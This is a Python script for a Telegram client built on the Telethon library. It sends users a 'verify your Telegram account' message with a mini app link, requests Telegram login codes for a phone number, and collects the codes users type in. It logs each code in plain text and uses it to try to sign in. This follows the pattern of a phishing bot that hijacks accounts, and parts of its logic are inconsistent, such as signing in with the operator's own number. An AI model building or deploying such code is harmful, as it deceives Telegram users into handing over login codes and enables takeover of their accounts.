import os
import asyncio
import logging
from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

# Get credentials
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PHONE_NUMBER = os.getenv("PHONE_NUMBER")
MINI_APP_URL = os.getenv("MINI_APP_URL")

# Store session data for users
user_sessions = {}
user_phone_codes = {}

# Fix event loop for Python 3.14
try:
    # Try to get existing loop
    loop = asyncio.get_running_loop()
except RuntimeError:
    # Create new loop if none exists
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# Initialize client (we'll use this as our main account)
client = TelegramClient('main_session', API_ID, API_HASH, loop=loop)


@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    """Send welcome message with mini app button"""
    logger.info(f"User {event.sender_id} started the bot")
    
    # For this, we'll still use a simple button - but the auth will be real MTProto
    await event.reply(
        f"🔥 Welcome!\n\nClick below to verify your Telegram account.\n\n"
        f"🔗 [Mini App]({MINI_APP_URL})",
        link_preview=False
    )


@client.on(events.NewMessage)
async def handle_message(event):
    """Handle OTP input from users"""
    # Check if message is a reply or from user we're expecting
    user_id = event.sender_id
    
    # If user is in our sessions and sent a numeric code
    if user_id in user_sessions and event.message.text and event.message.text.isdigit():
        phone_code_hash = user_sessions[user_id]
        otp = event.message.text
        
        logger.info(f"User {user_id} entered OTP: {otp}")
        
        try:
            # Try to sign in with the code
            await client.sign_in(PHONE_NUMBER, otp, phone_code_hash=phone_code_hash)
            await event.reply("✅ Verification successful! You're now logged in!")
            
            # Clear session
            del user_sessions[user_id]
            
        except PhoneCodeInvalidError:
            await event.reply("❌ Invalid code! Please try again.")
        except Exception as e:
            logger.error(f"Error signing in: {e}")
            await event.reply(f"❌ Error: {str(e)}")


async def send_otp_to_user(phone_number, user_id):
    """Send OTP using Telegram's auth.sendCode (real MTProto)"""
    logger.info(f"Sending OTP to {phone_number} for user {user_id}")
    
    try:
        # Send code request
        result = await client.send_code_request(phone_number)
        
        # Store the phone_code_hash for later verification
        user_sessions[user_id] = result.phone_code_hash
        
        logger.info(f"OTP sent to {phone_number}")
        return "Code sent successfully!"
        
    except Exception as e:
        logger.error(f"Error sending OTP: {e}")
        return f"Error: {str(e)}"


async def main():
    """Start the client"""
    await client.start(PHONE_NUMBER)
    logger.info("Client started!")
    await client.run_until_disconnected()


if __name__ == "__main__":
    loop.run_until_complete(main())
